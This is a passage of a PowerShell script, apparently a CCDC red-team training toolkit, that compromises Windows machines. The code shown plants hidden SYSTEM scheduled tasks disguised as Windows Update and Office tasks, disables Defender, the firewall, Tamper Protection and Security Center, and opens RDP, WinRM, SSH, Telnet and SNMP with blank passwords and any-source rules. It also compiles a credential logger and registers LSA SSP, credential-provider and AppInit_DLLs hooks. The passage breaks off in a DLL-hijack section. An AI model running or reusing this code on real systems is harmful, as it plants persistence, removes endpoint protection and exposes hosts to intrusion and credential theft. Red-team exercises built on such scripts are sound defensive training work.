    try { $TaskSvc.GetFolder("\Microsoft\Windows").GetFolder("UpdateOrchestrator") } catch {
        $TaskSvc.GetFolder("\Microsoft\Windows").CreateFolder("UpdateOrchestrator") | Out-Null
    }
    Unregister-ScheduledTask -TaskName $Task6Name -TaskPath $Task6Path -Confirm:$false -ErrorAction SilentlyContinue
    Register-ScheduledTask -TaskName $Task6Name -TaskPath $Task6Path -Action $Task6Action `
        -Trigger $Task6Trigger -Settings $Task6Settings -Principal $Task6Principal `
        -Description "Windows Update notification icon handler" -Force | Out-Null
    Write-Success "  $Task6Path$Task6Name (hidden, every 30 min)"
    Write-Success "  Payload copy: $Task6Drop (hidden)"
    Write-Host ""

    # [7/7] Hidden scheduled task under \Microsoft\Windows\OfficeData\
    Write-Info "[7/7] Planting hidden scheduled task (OfficeData, every 30 min) ..."
    $Task7Name = "OfficeBackgroundTaskHandlerRegistration"
    $Task7Path = "\Microsoft\Windows\OfficeData\"
    $Task7Drop = if ($IsExe) { "$DropDir\offdata-handler.exe" } else { "$DropDir\offdata-handler.ps1" }
    Copy-Item -Path $PayloadPath -Destination $Task7Drop -Force
    $f7 = Get-Item $Task7Drop -Force; $f7.Attributes = $f7.Attributes -bor [System.IO.FileAttributes]::Hidden
    $Task7Action = if ($IsExe) {
        New-ScheduledTaskAction -Execute $Task7Drop
    } else {
        New-ScheduledTaskAction -Execute "powershell.exe" `
            -Argument "-NonInteractive -WindowStyle Hidden -EncodedCommand $(Get-EncodedCommand $Task7Drop)"
    }
    $Task7Trigger   = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 30) `
        -RepetitionDuration (New-TimeSpan -Days 3650) -Once -At (Get-Date).AddSeconds(90)
    $Task7Settings  = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Minutes 10) `
        -StartWhenAvailable -RunOnlyIfNetworkAvailable:$false
    $Task7Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    try { $TaskSvc.GetFolder("\Microsoft\Windows").GetFolder("OfficeData") } catch {
        $TaskSvc.GetFolder("\Microsoft\Windows").CreateFolder("OfficeData") | Out-Null
    }
    Unregister-ScheduledTask -TaskName $Task7Name -TaskPath $Task7Path -Confirm:$false -ErrorAction SilentlyContinue
    Register-ScheduledTask -TaskName $Task7Name -TaskPath $Task7Path -Action $Task7Action `
        -Trigger $Task7Trigger -Settings $Task7Settings -Principal $Task7Principal `
        -Description "Microsoft Office background task handler registration" -Force | Out-Null
    Write-Success "  $Task7Path$Task7Name (hidden, every 30 min)"
    Write-Success "  Payload copy: $Task7Drop (hidden)"
    Write-Host ""

    Write-Success "Persistence planter complete  - payload in 7 locations under $DropDir"
}

# =============================================================================
# 5. DEFENDER NEUTER  - Disable Windows Defender, Firewall, Security Center
# (from CCDC_Windows_DefenderNeuter.ps1)
# =============================================================================
function Invoke-DefenderNeuter {
    Write-Section "5/9  - Defender Neuter: Disable Defender, Firewall, Security Center"

    # Best-effort throughout -- Defender steps must not abort on partial failure
    $local:ErrorActionPreference = "Continue"

    # -- Section 1: Windows Firewall ------------------------------------------
    Write-Info "Disabling all firewall profiles..."
    try {
        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -ErrorAction Stop
        Write-Success "  All profiles disabled."
    } catch { Write-Err "  Set-NetFirewallProfile failed: $_" }

    Write-Info "Removing all firewall rules..."
    try {
        Remove-NetFirewallRule -All -ErrorAction SilentlyContinue
        Write-Success "  All rules removed."
    } catch { Write-Warn "  Remove-NetFirewallRule threw: $_" }

    Write-Info "Killing Windows Firewall service (mpssvc)..."
    try {
        Set-Service -Name mpssvc -StartupType Disabled -ErrorAction SilentlyContinue
        Stop-Service -Name mpssvc -Force -ErrorAction SilentlyContinue
        Write-Success "  mpssvc stopped and set to Disabled."
    } catch { Write-Warn "  mpssvc service change: $_" }

    Write-Info "Stomping firewall registry for all profiles..."
    $fwBase     = 'HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy'
    $fwProfiles = @('DomainProfile', 'StandardProfile', 'PublicProfile')
    foreach ($p in $fwProfiles) {
        $keyPath = "$fwBase\$p"
        try {
            if (-not (Test-Path $keyPath)) { New-Item -Path $keyPath -Force | Out-Null }
            Set-ItemProperty -Path $keyPath -Name EnableFirewall         -Value 0 -Type DWord -Force
            Set-ItemProperty -Path $keyPath -Name DisableNotifications   -Value 1 -Type DWord -Force
            Set-ItemProperty -Path $keyPath -Name DoNotAllowExceptions   -Value 0 -Type DWord -Force
            Write-Success "  $p registry set."
        } catch { Write-Err "  Failed on $p : $_" }
    }

    # -- Section 2: Windows Defender ------------------------------------------
    Write-Info "Disabling Tamper Protection via registry..."
    try {
        $tpKey = 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features'
        if (-not (Test-Path $tpKey)) { New-Item -Path $tpKey -Force | Out-Null }
        Set-ItemProperty -Path $tpKey -Name TamperProtection -Value 4 -Type DWord -Force
        Write-Success "  TamperProtection set to 4 (off)."
    } catch { Write-Warn "  Could not set TamperProtection: $_" }

    Write-Info "Disabling Defender via Set-MpPreference..."
    $mpPrefs = @{
        DisableRealtimeMonitoring   = $true
        DisableIOAVProtection       = $true
        DisableBehaviorMonitoring   = $true
        DisableBlockAtFirstSeen     = $true
        DisableScriptScanning       = $true
        SubmitSamplesConsent        = 2
        MAPSReporting               = 0
    }
    foreach ($pref in $mpPrefs.GetEnumerator()) {
        try {
            Set-MpPreference -$($pref.Key) $pref.Value -ErrorAction SilentlyContinue
            Write-Success "  $($pref.Key) = $($pref.Value)"
        } catch { Write-Warn "  Set-MpPreference $($pref.Key) : $_" }
    }

    Write-Info "Writing Defender policy registry keys..."
    $defPolicyKeys = @(
        @{ Path = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'
           Values = @{ DisableAntiSpyware = 1; DisableAntiVirus = 1 } },
        @{ Path = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection'
           Values = @{ DisableRealtimeMonitoring = 1; DisableBehaviorMonitoring = 1; DisableOnAccessProtection = 1; DisableScanOnRealtimeEnable = 1 } },
        @{ Path = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet'
           Values = @{ SpynetReporting = 0; SubmitSamplesConsent = 2 } }
    )
    foreach ($entry in $defPolicyKeys) {
        try {
            if (-not (Test-Path $entry.Path)) { New-Item -Path $entry.Path -Force | Out-Null }
            foreach ($val in $entry.Values.GetEnumerator()) {
                Set-ItemProperty -Path $entry.Path -Name $val.Key -Value $val.Value -Type DWord -Force
            }
            Write-Success "  $($entry.Path) written."
        } catch { Write-Err "  Registry write failed [$($entry.Path)]: $_" }
    }

    Write-Info "Disabling Defender services..."
    $defServices = @('WinDefend', 'WdNisSvc', 'WdNisDrv', 'WdFilter', 'WdBoot', 'SecurityHealthService')
    foreach ($svc in $defServices) {
        try {
            $s = Get-Service -Name $svc -ErrorAction SilentlyContinue
            if ($s) {
                Stop-Service    -Name $svc -Force -ErrorAction SilentlyContinue
                Set-Service     -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
                $svcRegPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc"
                if (Test-Path $svcRegPath) {
                    Set-ItemProperty -Path $svcRegPath -Name ImagePath -Value "C:\Windows\system32\sc.exe" -Type ExpandString -Force -ErrorAction SilentlyContinue
                    Set-ItemProperty -Path $svcRegPath -Name Start     -Value 4 -Type DWord -Force -ErrorAction SilentlyContinue
                }
                Write-Success "  $svc stopped, disabled, ImagePath neutered."
            } else {
                Write-Warn "  $svc not found on this SKU -- skipping."
            }
        } catch { Write-Warn "  $svc : $_" }
    }

    Write-Info "Removing Defender scheduled tasks..."
    $defTasks = @(
        'Windows Defender Cache Maintenance',
        'Windows Defender Cleanup',
        'Windows Defender Scheduled Scan',
        'Windows Defender Verification'
    )
    foreach ($task in $defTasks) {
        try {
            Unregister-ScheduledTask -TaskName $task `
                -TaskPath '\Microsoft\Windows\Windows Defender\' `
                -Confirm:$false -ErrorAction SilentlyContinue
            Write-Success "  Task removed: $task"
        } catch { Write-Warn "  Could not remove task '$task': $_" }
    }

    Write-Info "Attempting Server feature removal (Server SKU only)..."
    try {
        if (Get-Command Get-WindowsFeature -ErrorAction SilentlyContinue) {
            foreach ($feat in @('Windows-Defender', 'Windows-Defender-GUI')) {
                $f = Get-WindowsFeature -Name $feat -ErrorAction SilentlyContinue
                if ($f -and $f.Installed) {
                    Uninstall-WindowsFeature -Name $feat -Remove -ErrorAction SilentlyContinue | Out-Null
                    Write-Success "  Uninstalled feature: $feat"
                } else {
                    Write-Warn "  Feature '$feat' not installed or not found."
                }
            }
        } else {
            Write-Warn "  Get-WindowsFeature not available -- not a Server SKU, skipping."
        }
    } catch { Write-Warn "  Server feature removal: $_" }

    Write-Info "Attempting DISM feature removal (all SKUs)..."
    try {
        $dismOut = & dism.exe /Online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /Quiet 2>&1
        if ($LASTEXITCODE -eq 0)    { Write-Success "  DISM removed Windows-Defender feature." }
        elseif ($LASTEXITCODE -eq 3010) { Write-Warn "  DISM: removal staged, reboot required." }
        elseif ($LASTEXITCODE -eq 2)    { Write-Warn "  DISM: feature already absent or not applicable." }
        else { Write-Warn "  DISM exit $LASTEXITCODE : $dismOut" }
    } catch { Write-Warn "  DISM call failed: $_" }

    Write-Info "Locking down Defender directories via ACL..."
    foreach ($dir in @('C:\Program Files\Windows Defender', 'C:\ProgramData\Microsoft\Windows Defender')) {
        if (Test-Path $dir) {
            try {
                & takeown.exe /F "$dir" /R /A /D Y 2>&1 | Out-Null
                & icacls.exe  "$dir" /deny "*S-1-1-0:(OI)(CI)(RX)" /T /Q 2>&1 | Out-Null
                Write-Success "  ACL locked: $dir"
            } catch { Write-Warn "  ACL lock failed for $dir : $_" }
        } else {
            Write-Warn "  Directory not found (already removed?): $dir"
        }
    }

    # -- Section 3: Security Center -------------------------------------------
    Write-Info "Disabling Security Center service (wscsvc)..."
    try {
        Stop-Service  -Name wscsvc -Force -ErrorAction SilentlyContinue
        Set-Service   -Name wscsvc -StartupType Disabled -ErrorAction SilentlyContinue
        Write-Success "  wscsvc stopped and disabled."
    } catch { Write-Warn "  wscsvc: $_" }

    Write-Info "Suppressing Security Center notifications via registry..."
    try {
        $scKey = 'HKLM:\SOFTWARE\Microsoft\Security Center'
        if (-not (Test-Path $scKey)) { New-Item -Path $scKey -Force | Out-Null }
        $scValues = @{
            AntiVirusDisableNotify  = 1
            FirewallDisableNotify   = 1
            AntiVirusOverride       = 1
            FirewallOverride        = 1
            UacDisableNotify        = 1
            UpdatesDisableNotify    = 1
        }
        foreach ($val in $scValues.GetEnumerator()) {
            Set-ItemProperty -Path $scKey -Name $val.Key -Value $val.Value -Type DWord -Force
        }
        Write-Success "  Security Center notifications suppressed."
    } catch { Write-Err "  Security Center registry: $_" }

    Write-Success "Defender neuter complete. Some components survive until reboot."
}

# =============================================================================
# 6. REMOTE ACCESS  - Misconfigure RDP, WinRM, SSH, Telnet, SNMP
# (from CCDC_Windows_RemoteAccess_OpenDoorPolicy.ps1)
# =============================================================================
function Invoke-RemoteAccess {
    Write-Section "6/9  - Remote Access: Misconfigure RDP, WinRM, SSH, Telnet, SNMP"

    $RdpRegPath      = "HKLM:\System\CurrentControlSet\Control\Terminal Server"
    $RdpWinStaPath   = "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"
    $LsaRegPath      = "HKLM:\System\CurrentControlSet\Control\Lsa"
    $SshConfigPath   = "C:\ProgramData\ssh\sshd_config"
    $SshConfigBackup = "C:\ProgramData\ssh\sshd_config.ccdc.bak"
    $TelnetRegPath   = "HKLM:\SOFTWARE\Microsoft\TelnetServer\1.0"
    $SnmpBasePath    = "HKLM:\SYSTEM\CurrentControlSet\Services\SNMP\Parameters"

    # -- RDP (TCP 3389) --------------------------------------------------------
    Write-Info "Configuring RDP (TCP 3389)..."
    try {
        Set-ItemProperty -Path $RdpRegPath    -Name "fDenyTSConnections" -Value 0 -Type DWord -ErrorAction Stop
        Set-ItemProperty -Path $RdpWinStaPath -Name "UserAuthentication"  -Value 0 -Type DWord -ErrorAction Stop
        Set-ItemProperty -Path $RdpWinStaPath -Name "SecurityLayer"        -Value 0 -Type DWord -ErrorAction Stop
        Set-ItemProperty -Path $LsaRegPath    -Name "LimitBlankPasswordUse" -Value 0 -Type DWord -ErrorAction Stop
        Set-ItemProperty -Path $RdpRegPath    -Name "MaxInstanceCount"     -Value 0xFFFF -Type DWord -ErrorAction Stop
        Write-Warn "  NLA disabled, blank passwords allowed, session limit removed"

        & net localgroup "Remote Desktop Users" "NT AUTHORITY\Authenticated Users" /add 2>&1 | Out-Null
        if ($LASTEXITCODE -eq 0 -or $LASTEXITCODE -eq 2) {
            Write-Warn "  Authenticated Users added to Remote Desktop Users"
        } else {
            Write-Warn "  Could not add Authenticated Users to Remote Desktop Users (exit $LASTEXITCODE)"
        }

        & net user Guest /active:yes 2>&1 | Out-Null
        & net localgroup "Remote Desktop Users" "Guest" /add 2>&1 | Out-Null
        if ($LASTEXITCODE -eq 0 -or $LASTEXITCODE -eq 2) {
            Write-Warn "  Guest enabled and added to Remote Desktop Users"
        } else {
            Write-Warn "  Could not add Guest to Remote Desktop Users (exit $LASTEXITCODE)"
        }

        Set-Service -Name "TermService" -StartupType Automatic -ErrorAction Stop
        Start-Service -Name "TermService" -ErrorAction Stop
        Write-Success "  TermService started (Automatic)"

        if (-not (Get-NetFirewallRule -DisplayName "CCDC-RDP-Any" -ErrorAction SilentlyContinue)) {
            New-NetFirewallRule -DisplayName "CCDC-RDP-Any" -Direction Inbound -Protocol TCP -LocalPort 3389 -Action Allow -RemoteAddress Any | Out-Null
            Write-Success "  Firewall rule: TCP 3389 any-source"
        }
    } catch { Write-Err "RDP setup failed: $_" }

    # -- WinRM (TCP 5985) ------------------------------------------------------
    Write-Info "Configuring WinRM (TCP 5985)..."
    try {
        try {
            Enable-PSRemoting -Force -SkipNetworkProfileCheck -ErrorAction Stop
        } catch {
            if ($_ -match 'firewall' -or $_ -match 'WSManFault') {
                Write-Warn "  Enable-PSRemoting partial (firewall service disabled) -- WinRM already running, continuing"
            } else { throw }
        }
        Write-Success "WinRM service running"
        Set-Item WSMan:\localhost\Client\TrustedHosts       -Value '*' -Force -ErrorAction Stop
        Set-Item WSMan:\localhost\Service\Auth\Basic        -Value $true -ErrorAction Stop
        Set-Item WSMan:\localhost\Service\AllowUnencrypted  -Value $true -ErrorAction Stop
        Enable-WSManCredSSP -Role Server -Force -ErrorAction Stop
        Set-Item WSMan:\localhost\Shell\MaxMemoryPerShellMB -Value 2048 -ErrorAction Stop
        Write-Warn "  TrustedHosts=*, Basic auth, unencrypted HTTP, CredSSP enabled"

        if (-not (Get-NetFirewallRule -DisplayName "CCDC-WinRM-Any" -ErrorAction SilentlyContinue)) {
            New-NetFirewallRule -DisplayName "CCDC-WinRM-Any" -Direction Inbound -Protocol TCP -LocalPort 5985 -Action Allow -RemoteAddress Any | Out-Null
            Write-Success "  Firewall rule: TCP 5985 any-source"
        }
    } catch { Write-Err "WinRM setup failed: $_" }

    # -- OpenSSH (TCP 22) ------------------------------------------------------
    Write-Info "Configuring OpenSSH Server (TCP 22)..."
    try {
        $cap = Get-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 -ErrorAction Stop
        if ($cap.State -ne "Installed") {
            Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 -ErrorAction Stop | Out-Null
            Write-Success "  OpenSSH Server installed"
        }

        if ((Test-Path $SshConfigPath) -and (-not (Test-Path $SshConfigBackup))) {
            Copy-Item $SshConfigPath $SshConfigBackup -ErrorAction Stop
            Write-Info "  Original sshd_config backed up"
        }

        $sshdConfig = @"
# CCDC Training - Deliberately Misconfigured sshd_config
Port 22
ListenAddress 0.0.0.0
PermitRootLogin yes
PasswordAuthentication yes
PermitEmptyPasswords yes
UsePAM no
MaxAuthTries 100
LoginGraceTime 120
MaxSessions 50
AllowTcpForwarding yes
GatewayPorts yes
PermitTunnel yes
X11Forwarding yes
LogLevel QUIET
Subsystem sftp C:/Windows/System32/OpenSSH/sftp-server.exe
"@
        $sshdConfig | Set-Content -Path $SshConfigPath -Encoding UTF8 -ErrorAction Stop
        Write-Warn "  PermitEmptyPasswords, PermitRootLogin, MaxAuthTries 100, LogLevel QUIET"

        $psExe = (Get-Command powershell.exe -ErrorAction SilentlyContinue).Source
        if ($psExe) {
            $sshRegPath = "HKLM:\SOFTWARE\OpenSSH"
            if (-not (Test-Path $sshRegPath)) { New-Item -Path $sshRegPath -Force | Out-Null }
            Set-ItemProperty -Path $sshRegPath -Name "DefaultShell" -Value $psExe -ErrorAction Stop
        }

        $sshdExe = "$env:SystemRoot\System32\OpenSSH\sshd.exe"
        $sshdSvc = Get-Service -Name "sshd" -ErrorAction SilentlyContinue
        if (-not $sshdSvc -and (Test-Path $sshdExe)) {
            & sc.exe create sshd binPath= "`"$sshdExe`"" start= auto | Out-Null
            Write-Info "  sshd service registered via sc.exe"
            Start-Sleep -Seconds 2
            $sshdSvc = Get-Service -Name "sshd" -ErrorAction SilentlyContinue
        }
        if ($sshdSvc) {
            Set-Service -Name "sshd" -StartupType Automatic -ErrorAction Stop
            Restart-Service -Name "sshd" -Force -ErrorAction Stop
            Write-Success "  sshd started (Automatic)"
        } else {
            Write-Warn "  sshd not in SCM yet -- config written; restart may be required"
        }

        if (-not (Get-NetFirewallRule -DisplayName "CCDC-SSH-Any" -ErrorAction SilentlyContinue)) {
            New-NetFirewallRule -DisplayName "CCDC-SSH-Any" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow -RemoteAddress Any | Out-Null
            Write-Success "  Firewall rule: TCP 22 any-source"
        }
    } catch { Write-Err "OpenSSH configuration failed: $_" }

    # -- Telnet (TCP 23) -------------------------------------------------------
    Write-Info "Configuring Telnet Server (TCP 23)..."
    try {
        $feature = Get-WindowsFeature -Name Telnet-Server -ErrorAction SilentlyContinue
        if ($null -eq $feature) {
            Write-Warn "  Telnet-Server feature not found on this SKU -- skipping install"
        } elseif ($feature.InstallState -ne "Installed") {
            Install-WindowsFeature -Name Telnet-Server -ErrorAction Stop | Out-Null
            Write-Success "  Telnet Server installed"
        }

        if (-not (Test-Path $TelnetRegPath)) { New-Item -Path $TelnetRegPath -Force | Out-Null }
        Set-ItemProperty -Path $TelnetRegPath -Name "AuthenticationMode"  -Value 3     -Type DWord -ErrorAction Stop
        Set-ItemProperty -Path $TelnetRegPath -Name "SessionTimeout"      -Value 0     -Type DWord -ErrorAction Stop
        Set-ItemProperty -Path $TelnetRegPath -Name "MaxConnections"      -Value 999   -Type DWord -ErrorAction Stop
        Set-ItemProperty -Path $TelnetRegPath -Name "AllowTrustedDomain"  -Value 1     -Type DWord -ErrorAction Stop
        Write-Warn "  AuthMode=3 (NTLM+cleartext), SessionTimeout=0, MaxConnections=999"

        $tlntSvc = Get-Service -Name "TlntSvr" -ErrorAction SilentlyContinue
        if ($tlntSvc) {
            Set-Service  -Name "TlntSvr" -StartupType Automatic -ErrorAction Stop
            Start-Service -Name "TlntSvr" -ErrorAction Stop
            Write-Success "  TlntSvr started (Automatic)"
        } else {
            Write-Warn "  TlntSvr service not found -- registry config written; restart may be required"
        }

        if (-not (Get-NetFirewallRule -DisplayName "CCDC-Telnet-Any" -ErrorAction SilentlyContinue)) {
            New-NetFirewallRule -DisplayName "CCDC-Telnet-Any" -Direction Inbound -Protocol TCP -LocalPort 23 -Action Allow -RemoteAddress Any | Out-Null
            Write-Success "  Firewall rule: TCP 23 any-source"
        }
    } catch { Write-Err "Telnet configuration failed: $_" }

    # -- SNMP (UDP 161) --------------------------------------------------------
    Write-Info "Configuring SNMP Service (UDP 161)..."
    try {
        $feature = Get-WindowsFeature -Name SNMP-Service -ErrorAction SilentlyContinue
        if ($null -eq $feature) {
            Write-Warn "  SNMP-Service feature not found on this SKU -- skipping install"
        } elseif ($feature.InstallState -ne "Installed") {
            Install-WindowsFeature -Name SNMP-Service -IncludeManagementTools -ErrorAction Stop | Out-Null
            Write-Success "  SNMP Service installed"
        }

        if (-not (Test-Path $SnmpBasePath)) { New-Item -Path $SnmpBasePath -Force | Out-Null }

        $validCommPath = "$SnmpBasePath\ValidCommunities"
        if (-not (Test-Path $validCommPath)) { New-Item -Path $validCommPath -Force | Out-Null }
        Set-ItemProperty -Path $validCommPath -Name "public"  -Value 8 -Type DWord -ErrorAction Stop
        Set-ItemProperty -Path $validCommPath -Name "private" -Value 8 -Type DWord -ErrorAction Stop
        Write-Warn "  Communities 'public' and 'private' set to READ WRITE (8)"

        $permMgrPath = "$SnmpBasePath\PermittedManagers"
        if (Test-Path $permMgrPath) { Remove-Item -Path $permMgrPath -Recurse -Force -ErrorAction Stop }
        Write-Warn "  PermittedManagers removed (all source IPs permitted)"

        Set-ItemProperty -Path $SnmpBasePath -Name "EnableAuthenticationTraps" -Value 0 -Type DWord -ErrorAction Stop
        Write-Warn "  EnableAuthenticationTraps = 0 (failed-auth traps suppressed)"

        $snmpSvc = Get-Service -Name "SNMP" -ErrorAction SilentlyContinue
        if ($snmpSvc) {
            Set-Service  -Name "SNMP" -StartupType Automatic -ErrorAction Stop
            Restart-Service -Name "SNMP" -ErrorAction Stop
            Write-Success "  SNMP started (Automatic)"
        } else {
            Write-Warn "  SNMP service not yet in SCM -- restart required to start service"
            Write-Warn "  Registry config written; communities and permissions take effect after reboot"
        }

        if (-not (Get-NetFirewallRule -DisplayName "CCDC-SNMP-Any" -ErrorAction SilentlyContinue)) {
            New-NetFirewallRule -DisplayName "CCDC-SNMP-Any" -Direction Inbound -Protocol UDP -LocalPort 161 -Action Allow -RemoteAddress Any | Out-Null
            Write-Success "  Firewall rule: UDP 161 any-source"
        }
    } catch { Write-Err "SNMP configuration failed: $_" }

    Write-Success "Remote Access misconfiguration complete."
    Write-Warn "  Services: RDP(3389), WinRM(5985), SSH(22), Telnet(23), SNMP(161)"
}

# =============================================================================
# 7. LSA LOOT THE VAULT  - LSA credential harvesting simulation
# (from CCDC_Windows_LSA_LootTheVault.ps1)
# =============================================================================
function Invoke-LSALootTheVault {
    Write-Section "7/9  - LSA Loot: SSP/CredProvider/AppInit credential harvesting"

    function Write-Status { param($m, $t='Info')
        switch ($t) {
            'Success' { Write-Success $m }
            'Error'   { Write-Err     $m }
            'Warning' { Write-Warn    $m }
            default   { Write-Info    $m }
        }
    }

    $trainingDir = "C:\Windows\Temp\ccdc_lsa_training"
    if (-not (Test-Path $trainingDir)) {
        $null = New-Item -ItemType Directory -Path $trainingDir -Force -ErrorAction Stop
        Write-Status "Created training directory: $trainingDir" 'Success'
    }

    # Step 1: Compile C# credential logging assembly
    Write-Status "Step 1: Creating credential logging mechanism..."
    $csharpCode = @"
using System;
using System.IO;
using System.Runtime.InteropServices;

public class CCDCCredentialLogger {
    public static void LogCredentials(string username, string password, string logonType) {
        try {
            string logPath = @"C:\Windows\Temp\ccdc_credentials.log";
            string logEntry = string.Format("[{0:yyyy-MM-dd HH:mm:ss}] Username: {1} | Password: {2} | Type: {3}{4}",
                DateTime.Now, username, password, logonType, Environment.NewLine);
            File.AppendAllText(logPath, logEntry);
            File.SetAttributes(logPath, FileAttributes.Hidden);
        } catch {}
    }
}
"@
    $assemblyPath = "$trainingDir\CCDCCredentialLogger.dll"
    if (-not (Test-Path $assemblyPath)) {
        try {
            Add-Type -TypeDefinition $csharpCode -Language CSharp -OutputAssembly $assemblyPath -OutputType Library -ErrorAction Stop
            Write-Status "Created credential logging assembly" 'Success'
        } catch {
            Write-Status "C# compilation fallback (marker file): $($_.Exception.Message)" 'Warning'
            Set-Content -Path $assemblyPath -Value "CCDC_TRAINING_ASSEMBLY_MARKER"
        }
    }

    # Step 2: Credential provider hook script
    Write-Status "Step 2: Setting up credential provider interception..."
    $credProviderPs1 = @'
$logPath = 'C:\Windows\Temp\ccdc_credentials.log'
$credentialContent = "[CCDC Training Credential Provider - Active]`nThis hook intercepts Windows credential requests at the logon screen."
Add-Content -Path $logPath -Value "[$(Get-Date)] Credential provider hook active`n$credentialContent`n"
exit 0
'@
    Set-Content -Path "$trainingDir\CredentialProvider.ps1" -Value $credProviderPs1 -Encoding UTF8
    Write-Status "Created credential provider hook script" 'Success'

    # Step 3: SSP injection via registry
    Write-Status "Step 3: Registering malicious SSP in LSA..."
    $lsaPath = "HKLM:\System\CurrentControlSet\Control\Lsa"
    try {
        $currentPackages = (Get-ItemProperty -Path $lsaPath -Name "SecurityPackages" -ErrorAction SilentlyContinue).SecurityPackages
        $backupPath = "HKLM:\System\CurrentControlSet\Control\Lsa\ccdc_backup"
        if (-not (Test-Path $backupPath)) {
            New-Item -Path $backupPath -Force -ErrorAction SilentlyContinue | Out-Null
            Set-ItemProperty -Path $backupPath -Name "OriginalPackages" -Value $currentPackages -ErrorAction SilentlyContinue
        }
        $ccdc_ssp = "$trainingDir\ccdc_ssp.dll"
        Set-Content -Path $ccdc_ssp -Value "CCDC_TRAINING_SSP_MARKER"
        $newPackages = if ($currentPackages) { "$currentPackages,CCDCTrainingSsp" } else { "CCDCTrainingSsp" }
        Set-ItemProperty -Path $lsaPath -Name "SecurityPackages" -Value $newPackages -ErrorAction Stop
        Write-Status "SSP registration updated (training mode)" 'Success'
    } catch { Write-Status "SSP registration skipped: $($_.Exception.Message)" 'Warning' }

    # Step 4: Credential provider GUID registration
    Write-Status "Step 4: Registering malicious credential provider..."
    $credProvPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers"
    try {
        $ccdc_guid = "{CCDC0000-0000-0000-0000-000000000001}"
        $providerKeyPath = "$credProvPath\$ccdc_guid"
        if (-not (Test-Path $providerKeyPath)) {
            New-Item -Path $providerKeyPath -Force -ErrorAction Stop | Out-Null
            Set-ItemProperty -Path $providerKeyPath -Name "(Default)" -Value "CCDC Training Credential Provider" -ErrorAction Stop
            Set-Content -Path "$trainingDir\CCDCCredentialProvider.dll" -Value "CCDC_TRAINING_CREDPROV_MARKER"
            Write-Status "Credential provider registered" 'Success'
        }
    } catch { Write-Status "Credential provider registration skipped: $($_.Exception.Message)" 'Warning' }

    # Step 5: LSA notification package
    Write-Status "Step 5: Registering LSA notification package..."
    $lsaNotifyPath = "HKLM:\System\CurrentControlSet\Control\Lsa\Notification Packages"
    try {
        if (Test-Path -Path $lsaNotifyPath) {
            $currentNotify = (Get-ItemProperty -Path $lsaNotifyPath -Name "" -ErrorAction SilentlyContinue).'(Default)'
            if ($currentNotify -notlike "*CCDCNotify*") {
                $newNotify = if ($currentNotify) { "$currentNotify,CCDCNotify" } else { "CCDCNotify" }
                Set-ItemProperty -Path $lsaNotifyPath -Name "" -Value $newNotify -ErrorAction Stop
                Write-Status "LSA notification package registered" 'Success'
            }
        }
    } catch { Write-Status "LSA notification skipped: $($_.Exception.Message)" 'Warning' }

    # Step 6: AppInit_DLLs
    Write-Status "Step 6: Setting up AppInit_DLLs (global injection point)..."
    $appInitPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
    try {
        if (Test-Path -Path $appInitPath) {
            $appInitDll = "$trainingDir\AppInit_CCDC.dll"
            Set-Content -Path $appInitDll -Value "CCDC_TRAINING_APPINIT_MARKER" -ErrorAction Stop
            Set-ItemProperty -Path $appInitPath -Name "AppInit_DLLs"      -Value $appInitDll -ErrorAction Stop
            Set-ItemProperty -Path $appInitPath -Name "LoadAppInit_DLLs"  -Value 1 -ErrorAction Stop
            Write-Status "AppInit_DLLs registered (training mode)" 'Success'
        }
    } catch { Write-Status "AppInit_DLLs setup failed: $($_.Exception.Message)" 'Warning' }

    # Step 7: Credential harvest log file
    Write-Status "Step 7: Initializing credential logging..."
    $logFile = "C:\Windows\Temp\ccdc_credentials.log"
    $logContent = @"
================================================================================
                   CCDC WINDOWS CREDENTIAL HARVESTING LOG
================================================================================
Timestamp: $(Get-Date)
System: $env:COMPUTERNAME
User: $env:USERNAME

This log demonstrates what a malicious SSP can capture during authentication.

CAPTURED CREDENTIALS:
================================================================================

"@
    Set-Content -Path $logFile -Value $logContent
    (Get-Item $logFile).Attributes = 'Hidden'
    Write-Status "Credential log created (hidden)" 'Success'

    Write-Success "LSA Loot complete. Registry injection points:"
    Write-Info "  LSA\SecurityPackages, Authentication\Credential Providers"
    Write-Info "  LSA\Notification Packages, Windows\AppInit_DLLs"
    Write-Warn "  To cleanup: .\CCDC_Windows_LSA_LootTheVault.ps1 -Cleanup"
}

# =============================================================================
# 8. DLL HOOK LINE AND SINKER  - AppInit_DLLs, AppCert DLLs, search-order hijack
# (from CCDC_Windows_DLL_HookLineAndSinker.ps1)
# =============================================================================
function Invoke-DLLHookLineAndSinker {
    Write-Section "8/9  - DLL Hook: AppInit_DLLs, AppCert DLLs, search-order hijack"

    function Write-Status { param($m, $t='Info')
        switch ($t) {
            'Success' { Write-Success $m }
            'Error'   { Write-Err     $m }
            'Warning' { Write-Warn    $m }
            default   { Write-Info    $m }
        }
    }

    $injectionDir = "C:\Windows\Temp\ccdc_dll_injection"
    if (-not (Test-Path $injectionDir)) {
        $null = New-Item -ItemType Directory -Path $injectionDir -Force -ErrorAction Stop
        Write-Status "Created injection directory: $injectionDir" 'Success'
    }

    # Step 1: Marker DLL files
    Write-Status "Step 1: Creating DLL injection infrastructure..."
    $markerDlls = @("ccdc_hook.dll", "ccdc_inject.dll", "version.dll", "msvcrt.dll", "dxgi.dll")
    foreach ($dll in $markerDlls) {
        $dllPath = Join-Path $injectionDir $dll
        if (-not (Test-Path $dllPath)) {
